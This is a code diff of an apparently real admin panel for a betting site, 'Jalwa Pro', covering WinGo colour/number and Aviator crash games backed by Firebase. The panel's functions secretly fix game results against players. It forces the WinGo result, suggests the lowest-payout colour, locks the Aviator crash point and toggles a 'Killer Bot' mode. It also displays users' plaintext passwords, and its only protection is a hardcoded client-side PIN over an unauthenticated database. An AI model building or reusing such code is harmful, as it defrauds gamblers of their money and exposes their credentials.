@@ -1,117 +1,333 @@
 <!DOCTYPE html>
-<html lang="hi">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Jalwa Master Admin</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Jalwa Pro - God Control</title>
+    <!-- Firebase SDK -->
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
-        :root {
-            --bg: #050810;
-            --card: #10142d;
-            --accent: #00f2ff;
-            --border: #1f2855;
-            --nav-bg: #161d2b;
+        :root { 
+            --bg: #06091b; --card: #10142d; --primary: #ffcc00; 
+            --green: #1DB954; --red: #f44336; --violet: #9c27b0; --text: #a4b0be; --cyan: #00ffca;
         }
+        * { box-sizing: border-box; font-family: 'Poppins', sans-serif; }
+        body { background: var(--bg); color: white; margin: 0; padding-bottom: 50px; overflow-x: hidden; }
 
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
-        
-        body { 
-            background: var(--bg); 
-            height: 100vh; 
-            display: flex; 
-            flex-direction: column; 
-            overflow: hidden; 
-            color: white;
-        }
+        /* --- Blinking Animation --- */
+        @keyframes high-bet-pulse { 50% { background: #851c1c; box-shadow: 0 0 20px #f44336; border-color: #fff; transform: scale(1.05); } }
+        .is-high-load { animation: high-bet-pulse 0.5s infinite !important; z-index: 100; }
+        @keyframes active-fix-pulse { 50% { box-shadow: 0 0 25px var(--cyan); border-color: white; transform: scale(1.05); } }
+        .fixed-active { animation: active-fix-pulse 0.6s infinite; border-color: white !important; }
 
-        .admin-header {
-            padding: 12px;
-            background: var(--card);
-            border-bottom: 1px solid var(--border);
-            text-align: center;
-            font-weight: 900;
-            color: var(--accent);
-            font-size: 13px;
-            text-transform: uppercase;
-        }
+        /* --- Header & Summary --- */
+        .header { background: var(--card); padding: 15px 20px; border-bottom: 2px solid var(--primary); position: sticky; top: 0; z-index: 1001; display: flex; justify-content: space-between; align-items: center; }
+        .summary-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; padding: 15px; }
+        .s-card { background: var(--card); padding: 15px; border-radius: 12px; border-left: 3px solid var(--primary); }
+        .s-card small { font-size: 10px; color: var(--text); display: block; text-transform: uppercase; }
+        .s-card b { font-size: 18px; color: var(--primary); }
 
-        /* 🚨 NAVIGATION UPAR SHIFT KIYA HAI */
-        .nav-bar {
-            display: flex;
-            background: var(--nav-bg);
-            border-bottom: 2px solid var(--border);
-            padding: 8px 0;
-            z-index: 1000;
-        }
+        /* --- Sidebar / Tabs --- */
+        .tab-bar { display: flex; background: #161d3d; border-bottom: 1px solid #1f2855; position: sticky; top: 62px; z-index: 1000; overflow-x: auto; scrollbar-width: none; }
+        .tab { flex: 1; text-align: center; padding: 15px; font-size: 11px; font-weight: 800; cursor: pointer; color: var(--text); white-space: nowrap; border-bottom: 3px solid transparent; }
+        .tab.active { color: var(--primary); border-bottom-color: var(--primary); background: rgba(255,204,0,0.05); }
 
-        .nav-item {
-            flex: 1;
-            text-align: center;
-            color: #7e87a8;
-            font-size: 10px;
-            font-weight: bold;
-            cursor: pointer;
-            transition: 0.3s;
-        }
+        .container { padding: 15px; }
+        .section { display: none; }
+        .section.active { display: block; }
 
-        .nav-item i {
-            display: block;
-            font-size: 18px;
-            margin-bottom: 3px;
-        }
+        /* --- WinGo Admin UI (Synced) --- */
+        .color-row { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 10px; margin: 15px 0; }
+        .color-card { padding: 15px 5px; border-radius: 12px; text-align: center; font-weight: 900; cursor: pointer; border: 2px solid transparent; }
+        .num-grid { display: grid; grid-template-columns: repeat(5, 1fr); gap: 10px; }
+        .n-ball { width: 100%; aspect-ratio: 1; border-radius: 50%; display: flex; flex-direction: column; align-items: center; justify-content: center; font-weight: bold; font-size: 18px; border: 1px solid #333; position: relative; cursor: pointer; }
+        .n-amt { font-size: 8px; color: var(--primary); position: absolute; bottom: -12px; font-weight: bold;}
+        .analysis-box { background: var(--card); padding: 15px; border-radius: 15px; border: 1px dashed var(--primary); margin-top: 25px; }
+        .row-justify { display: flex; justify-content: space-between; padding: 5px 0; font-size: 13px; }
+        .advice { background: rgba(0,255,202,0.1); padding: 10px; border-radius: 10px; text-align: center; font-weight: 900; color: var(--cyan); border: 1px dashed var(--cyan); margin-top: 10px; font-size: 12px; }
 
-        .nav-item.active {
-            color: var(--accent);
-            border-bottom: 2px solid var(--accent);
-            padding-bottom: 4px;
-        }
+        /* --- Data Cards (Users & Payments) --- */
+        .data-card { background: var(--card); margin-bottom: 12px; padding: 18px; border-radius: 15px; border: 1px solid #1f2855; position: relative; }
+        .user-phone { font-size: 16px; font-weight: 800; color: #fff; }
+        .pass-chip { background: #000; color: var(--cyan); padding: 2px 8px; border-radius: 5px; font-family: monospace; font-size: 12px; border: 1px solid #1f2855; }
+        .btn-row { display: flex; gap: 10px; margin-top: 15px; }
+        .btn { flex: 1; padding: 12px; border: none; border-radius: 10px; font-weight: 900; cursor: pointer; text-transform: uppercase; font-size: 11px; }
+        .btn-green { background: var(--green); color: #000; }
+        .btn-red { background: var(--red); color: #fff; }
+        .btn-blue { background: #0081ff; color: #fff; }
 
-        /* Iframe styling */
-        #mainDisplay {
-            flex-grow: 1;
-            width: 100%;
-            border: none;
-            background: var(--bg);
-        }
+        input { width: 100%; padding: 12px; background: #000; border: 1px solid #1f2855; color: #fff; border-radius: 10px; margin-top: 10px; outline: none; }
+        #auth-lock { position: fixed; inset: 0; background: var(--bg); z-index: 100000; display: flex; flex-direction: column; align-items: center; justify-content: center; }
+        .status-dot { width: 8px; height: 8px; border-radius: 50%; display: inline-block; margin-right: 5px; background: gray; }
+        .online-dot { background: var(--green); box-shadow: 0 0 10px var(--green); }
     </style>
 </head>
 <body>
 
-    <div class="admin-header">JALWA PRO MASTER CONTROL</div>
+<div id="auth-lock">
+    <h2 style="color:var(--primary); letter-spacing: 5px;">GOD ACCESS</h2>
+    <input type="password" id="adminPin" placeholder="ENTER ACCESS PIN">
+    <button class="btn btn-green" style="width:120px" onclick="unlock()">UNLOCK</button>
+</div>
 
-    <div class="nav-bar">
-        <div class="nav-item active" onclick="changePage('player.html', this)">
-            <i class="fas fa-users-cog"></i>
-            PLAYERS
+<div class="header">
+    <div style="font-weight: 900; color: var(--primary);">JALWA MASTER</div>
+    <div id="liveClock" style="color:var(--green); font-family:monospace; font-weight:bold;">00:00:00</div>
+</div>
+
+<div class="summary-grid">
+    <div class="s-card"><small>Total Users</small><b id="stTotalU">0</b></div>
+    <div class="s-card"><small>Today Joined</small><b id="stTodayU">0</b></div>
+    <div class="s-card"><small>System Assets</small><b id="stTotalBal">₹0</b></div>
+    <div class="s-card"><small>Live Players</small><b id="stLiveU" style="color:var(--green)">0</b></div>
+</div>
+
+<div class="tab-bar">
+    <div class="tab active" onclick="switchTab('wingo', this)">WINGO</div>
+    <div class="tab" onclick="switchTab('aviator', this)">AVIATOR</div>
+    <div class="tab" onclick="switchTab('users', this)">USER DB</div>
+    <div class="tab" onclick="switchTab('reqs', this)">PAYMENTS</div>
+</div>
+
+<div class="container">
+
+    <!-- 1. WINGO SECTION -->
+    <div id="sec-wingo" class="section active">
+        <div class="header" style="background:transparent; border:none; padding:0; margin-bottom:15px;">
+            <b id="wPid">ID: ...</b>
+            <b id="wTimer" style="font-size:24px; color:#fff">00s</b>
         </div>
-
-        <div class="nav-item" onclick="changePage('wallet.html', this)">
-            <i class="fas fa-wallet"></i>
-            WALLET
+        <div class="color-row">
+            <div id="cardGreen" class="color-card" style="background:var(--green)" onclick="fixW('Green')">GREEN<br><span id="lGreen">₹0</span></div>
+            <div id="cardViolet" class="color-card" style="background:var(--violet)" onclick="fixW('Violet')">VIOLET<br><span id="lViolet">₹0</span></div>
+            <div id="cardRed" class="color-card" style="background:var(--red)" onclick="fixW('Red')">RED<br><span id="lRed">₹0</span></div>
         </div>
-
-        <div class="nav-item" onclick="changePage('game.html', this)">
-            <i class="fas fa-gamepad"></i>
-            GAMES
+        <div class="num-grid" id="nGrid"></div>
+        <div class="analysis-box">
+            <div class="row-justify"><span>Collection:</span><b id="tColl">₹0</b></div>
+            <div class="row-justify" style="color:var(--red)"><span>Payout Green:</span><b id="pG">₹0</b></div>
+            <div class="row-justify" style="color:var(--red)"><span>Payout Red:</span><b id="pR">₹0</b></div>
+            <div class="advice" id="godAdvice">SYSTEM ANALYZING BETS...</div>
+            <button class="btn" style="width:100%; margin-top:15px; background:none; border:1px solid #333; color:gray" onclick="db.ref('gameControl/manualResult').set('none')">RESET TO AUTO</button>
         </div>
     </div>
 
-    <iframe id="mainDisplay" name="mainDisplay" src="player.html"></iframe>
+    <!-- 2. AVIATOR SECTION -->
+    <div id="sec-aviator" class="section">
+        <div class="data-card">
+            <small>Live Table Betting</small>
+            <h2 id="aviLiveBets" style="margin:10px 0; color:var(--primary)">₹0.00</h2>
+            <input type="number" id="crashFix" placeholder="Lock Crash Point (Ex: 1.05)" step="0.01">
+            <button class="btn btn-red" style="width:100%; margin-top:10px;" onclick="fixAvi()">SET CRASH NOW</button>
+        </div>
+        <div class="data-card">
+            <b>Killer Bot Logic</b><br><br>
+            <div class="row-justify">
+                <span>Hard Kill Mode: <b id="killStatus" style="color:var(--green)">ON</b></span>
+                <button class="btn btn-blue" style="width:100px" onclick="toggleKiller()">TOGGLE</button>
+            </div>
+        </div>
+    </div>
 
-    <script>
-        function changePage(fileName, element) {
-            // Iframe mein file load karo
-            document.getElementById('mainDisplay').src = fileName;
-            
-            // Active class update karo
-            let buttons = document.getElementsByClassName('nav-item');
-            for (let i = 0; i < buttons.length; i++) {
-                buttons[i].classList.remove('active');
-            }
-            element.classList.add('active');
+    <!-- 3. USER DATABASE -->
+    <div id="sec-users" class="section">
+        <input type="text" id="uSearch" placeholder="Search by Phone or Password..." onkeyup="searchUsers()">
+        <div id="userList" style="margin-top:15px"></div>
+    </div>
+
+    <!-- 4. PAYMENTS -->
+    <div id="sec-reqs" class="section">
+        <h4 style="color:var(--primary); margin: 0 0 10px 5px;">PENDING RECHARGES</h4>
+        <div id="depList"></div>
+        <h4 style="color:var(--primary); margin: 20px 0 10px 5px;">PENDING PAYOUTS</h4>
+        <div id="witList"></div>
+    </div>
+
+</div>
+
+<script>
+    const firebaseConfig = { databaseURL: "https://jalwav7-default-rtdb.firebaseio.com" };
+    if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+
+    function unlock() {
+        if(document.getElementById('adminPin').value === "8955") {
+            document.getElementById('auth-lock').style.display = 'none';
+            initAdmin();
+        } else { alert("DENIED"); }
+    }
+
+    function switchTab(id, el) {
+        document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
+        document.getElementById('sec-' + id).classList.add('active');
+        document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+        el.classList.add('active');
+    }
+
+    function initAdmin() {
+        startWinGoSync();
+        loadUsersSync();
+        loadPaymentsSync();
+        loadAviatorSync();
+    }
+
+    // --- WinGo GOD MODULE (Original Logic) ---
+    function startWinGoSync() {
+        let gridHtml = "";
+        for(let i=0; i<=9; i++) {
+            let col = (i==0||i==5)?'#9c27b0':(i%2==0? '#ff4757':'#1DB954');
+            gridHtml += `<div id="nb${i}" class="n-ball" style="background:${col}" onclick="fixW(${i})">${i}<span class="n-amt" id="v${i}">₹0</span></div>`;
         }
-    </script>
+        document.getElementById('nGrid').innerHTML = gridHtml;
 
+        setInterval(() => {
+            const now = new Date();
+            const sec = now.getSeconds();
+            const rem = 30 - (sec % 30);
+            document.getElementById('wTimer').innerText = rem + "s";
+            document.getElementById('liveClock').innerText = now.toLocaleTimeString();
+            document.getElementById('wPid').innerText = "ID: " + Math.floor(Date.now()/30000);
+        }, 1000);
+
+        db.ref('gameControl/manualResult').on('value', snap => {
+            let v = snap.val();
+            document.querySelectorAll('.color-card, .n-ball').forEach(el => el.classList.remove('fixed-active'));
+            if(v==='Green') document.getElementById('cardGreen').classList.add('fixed-active');
+            else if(v==='Red') document.getElementById('cardRed').classList.add('fixed-active');
+            else if(v==='Violet') document.getElementById('cardViolet').classList.add('fixed-active');
+            else if(typeof v === 'number') document.getElementById('nb'+v).classList.add('fixed-active');
+        });
+
+        db.ref('gameControl/wingo/liveBets').on('value', snap => {
+            const b = snap.val() || {};
+            let total = 0, gP = 0, rP = 0, max = 0, maxId = "";
+            const map = [
+                {id:'nb0',v:'v0',amt:b.num0||0}, {id:'nb1',v:'v1',amt:b.num1||0}, {id:'nb2',v:'v2',amt:b.num2||0},
+                {id:'nb3',v:'v3',amt:b.num3||0}, {id:'nb4',v:'v4',amt:b.num4||0}, {id:'nb5',v:'v5',amt:b.num5||0},
+                {id:'nb6',v:'v6',amt:b.num6||0}, {id:'nb7',v:'v7',amt:b.num7||0}, {id:'nb8',v:'v8',amt:b.num8||0},
+                {id:'nb9',v:'v9',amt:b.num9||0}, {id:'cardGreen',v:'lGreen',amt:b.Green||0},
+                {id:'cardRed',v:'lRed',amt:b.Red||0}, {id:'cardViolet',v:'lViolet',amt:b.Violet||0}
+            ];
+            map.forEach(m => {
+                total += m.amt; document.getElementById(m.v).innerText = "₹" + m.amt;
+                document.getElementById(m.id).classList.remove('is-high-load');
+                if(m.amt > max) { max = m.amt; maxId = m.id; }
+            });
+            if(maxId && max > 0) document.getElementById(maxId).classList.add('is-high-load');
+            gP = (b.Green||0)*2 + (b.num1||0)*9 + (b.num3||0)*9 + (b.num7||0)*9 + (b.num9||0)*9;
+            rP = (b.Red||0)*2 + (b.num2||0)*9 + (b.num4||0)*9 + (b.num6||0)*9 + (b.num8||0)*9;
+            document.getElementById('tColl').innerText = "₹" + total;
+            document.getElementById('pG').innerText = "₹" + gP;
+            document.getElementById('pR').innerText = "₹" + rP;
+            if(total > 0) document.getElementById('godAdvice').innerText = gP < rP ? "ADVICE: WIN GREEN" : "ADVICE: WIN RED";
+        });
+    }
+
+    // --- USER DATABASE MODULE ---
+    function loadUsersSync() {
+        const today = new Date().toLocaleDateString();
+        db.ref('users').on('value', snap => {
+            let html = "", tU = 0, todU = 0, tBal = 0, liveU = 0;
+            const now = Date.now();
+            snap.forEach(u => {
+                const d = u.val(); tU++; tBal += (d.balance||0);
+                if(new Date(d.regDate).toLocaleDateString() === today) todU++;
+                let isOnline = (now - (d.lastActive||0)) < 60000;
+                if(isOnline) liveU++;
+
+                html += `<div class="data-card u-item" data-search="${d.phone} ${d.password}">
+                    <div class="row-justify">
+                        <b class="user-phone"><span class="status-dot ${isOnline?'online-dot':''}"></span>${d.phone}</b>
+                        <b style="color:var(--green)">₹${Number(d.balance).toFixed(2)}</b>
+                    </div>
+                    <p>Password: <span class="pass-chip">${d.password}</span></p>
+                    <div class="btn-row">
+                        <button class="btn btn-blue" onclick="editB('${d.phone}')">EDIT BAL</button>
+                        <button class="btn btn-red" onclick="delU('${d.phone}')">DEL USER</button>
+                    </div>
+                </div>`;
+            });
+            document.getElementById('userList').innerHTML = html;
+            document.getElementById('stTotalU').innerText = tU;
+            document.getElementById('stTodayU').innerText = todU;
+            document.getElementById('stTotalBal').innerText = "₹" + Math.floor(tBal).toLocaleString();
+            document.getElementById('stLiveU').innerText = liveU;
+        });
+    }
+
+    // --- PAYMENTS MODULE ---
+    function loadPaymentsSync() {
+        db.ref('requests/deposits').on('value', snap => {
+            let html = "";
+            snap.forEach(d => {
+                const r = d.val();
+                if(r.status === 'pending') {
+                    html += `<div class="data-card">
+                        <b>₹${r.amount} - ${r.userId}</b><p>UTR: <span style="color:var(--primary)">${r.utr}</span></p>
+                        <div class="btn-row">
+                            <button class="btn btn-green" onclick="approveDep('${d.key}','${r.userId}',${r.amount})">APPROVE</button>
+                            <button class="btn btn-red" onclick="stUp('deposits','${d.key}','rejected')">REJECT</button>
+                        </div>
+                    </div>`;
+                }
+            });
+            document.getElementById('depList').innerHTML = html || "<p style='text-align:center; padding:10px; color:gray'>No Recharges</p>";
+        });
+
+        db.ref('requests/withdrawals').on('value', snap => {
+            let html = "";
+            snap.forEach(w => {
+                const r = w.val();
+                if(r.status === 'pending') {
+                    html += `<div class="data-card">
+                        <b>₹${r.amount} - ${r.userId}</b><p>UPI: <span style="color:var(--cyan)">${r.upiId}</span></p>
+                        <div class="btn-row">
+                            <button class="btn btn-green" onclick="stUp('withdrawals','${w.key}','success')">SUCCESS</button>
+                            <button class="btn btn-red" onclick="rejectWit('${w.key}','${r.userId}',${r.amount})">REJECT & REFUND</button>
+                        </div>
+                    </div>`;
+                }
+            });
+            document.getElementById('witList').innerHTML = html || "<p style='text-align:center; padding:10px; color:gray'>No Withdrawals</p>";
+        });
+    }
+
+    // --- AVIATOR MODULE ---
+    function loadAviatorSync() {
+        db.ref('gameSettings/aviator/liveBets').on('value', snap => {
+            let t = 0; snap.forEach(b => t += Number(b.val().amt));
+            document.getElementById('aviLiveBets').innerText = "₹" + t.toFixed(2);
+        });
+    }
+
+    // --- FUNCTIONS & ACTIONS ---
+    function fixW(v) { db.ref('gameControl/manualResult').set(v); }
+    function fixAvi() { const v = document.getElementById('crashFix').value; if(v) db.ref('gameSettings/aviator/control/manualCrash').set(Number(v)); }
+    function toggleKiller() { db.ref('admin_settings/mode').once('value', s => { let n = s.val()==='hard'?'normal':'hard'; db.ref('admin_settings/mode').set(n); document.getElementById('killStatus').innerText = n.toUpperCase(); }); }
+    async function approveDep(k, u, a) {
+        const uRef = db.ref('users/'+u);
+        const s = await uRef.once('value');
+        const d = s.val();
+        await uRef.update({ balance: (d.balance||0) + parseFloat(a), totalDeposit: (d.totalDeposit||0) + parseFloat(a) });
+        db.ref('requests/deposits/'+k).update({ status: 'approved' });
+    }
+    async function rejectWit(k, u, a) {
+        const uRef = db.ref('users/'+u);
+        const s = await uRef.once('value');
+        await uRef.update({ balance: (s.val().balance||0) + parseFloat(a) });
+        db.ref('requests/withdrawals/'+k).update({ status: 'rejected' });
+    }
+    function stUp(p, k, st) { db.ref('requests/'+p+'/'+k).update({ status: st }); }
+    function editB(ph) { const n = prompt("New Bal:"); if(n) db.ref('users/'+ph).update({ balance: Number(n) }); }
+    function delU(ph) { if(confirm("Delete " + ph + "?")) db.ref('users/'+ph).remove(); }
+    function searchUsers() {
+        let q = document.getElementById('uSearch').value.toLowerCase();
+        document.querySelectorAll('.u-item').forEach(i => {
+            i.style.display = i.getAttribute('data-search').toLowerCase().includes(q) ? "block" : "none";
+        });
+    }
+</script>
 </body>
 </html>
